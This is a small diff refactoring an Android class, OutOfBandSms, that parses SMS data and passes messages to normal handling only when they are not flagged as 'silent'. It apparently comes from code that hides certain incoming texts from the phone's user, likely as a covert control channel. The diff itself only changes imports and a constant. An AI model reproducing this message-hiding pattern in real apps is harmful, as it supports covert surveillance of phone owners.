@@ -3,13 +3,11 @@ package com.android.dvci.module.message;
 import android.telephony.SmsMessage;
 
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.listener.LowEventHandlerSms;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.LowEvent;
-import com.android.dvci.util.LowEventHandlerDefs;
+import com.android.dvci.util.LowEventMsg;
 import com.android.dvci.util.SmsHeader;
 import com.android.dvci.util.SmsMessageBase;
-import com.android.dvci.util.StringUtils;
 
 /**
  * Created by zad on 05/06/15.
@@ -74,7 +72,7 @@ public class OutOfBandSms {
 	}
 	public OutOfBandSms(LowEventSms lls) {
 		processPdu(lls.sms_event.data);
-		if( lls.sms_event.type  != LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT){
+		if( lls.sms_event.type  != LowEventMsg.EVENT_TYPE_SMS_SILENT){
 			dispatchNormalMessagePdu(lls.sms_event);
 		}
 	}
